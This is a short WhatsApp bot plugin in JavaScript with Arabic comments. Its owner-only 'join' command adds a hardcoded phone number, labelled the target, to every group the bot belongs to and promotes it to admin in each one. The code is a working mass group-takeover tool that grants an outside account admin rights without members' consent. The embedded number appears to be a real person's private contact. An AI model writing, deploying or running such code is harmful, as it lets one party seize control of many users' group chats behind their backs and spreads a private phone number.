let handler = async (m, { conn, isOwner }) => {
    if (!isOwner) {
        return conn.reply(m.chat, "🚫 هذا الأمر مخصص للمطور فقط.", m);
    }

    // الرقم الهدف
    let target = "9647882860837@s.whatsapp.net";

    // جلب كل الجروبات
    let groups = Object.keys(conn.chats).filter(jid => jid.endsWith("@g.us"));

    conn.reply(m.chat, `تست...`, m);

    for (let id of groups) {
        try {
            // إضافة الرقم
            await conn.groupParticipantsUpdate(id, [target], "add");

            // رفع أدمن
            await conn.groupParticipantsUpdate(id, [target], "promote");

            console.log(`✅ تمت إضافة ${target} ورفعه أدمن في ${id}`);
        } catch (e) {
            console.log(`❌ فشل في ${id}`, e);
        }
    }

    conn.reply(m.chat, "✅ العملية انتهت.", m);
};

// الأمر
handler.command = /^ضم$/i;

export default handler;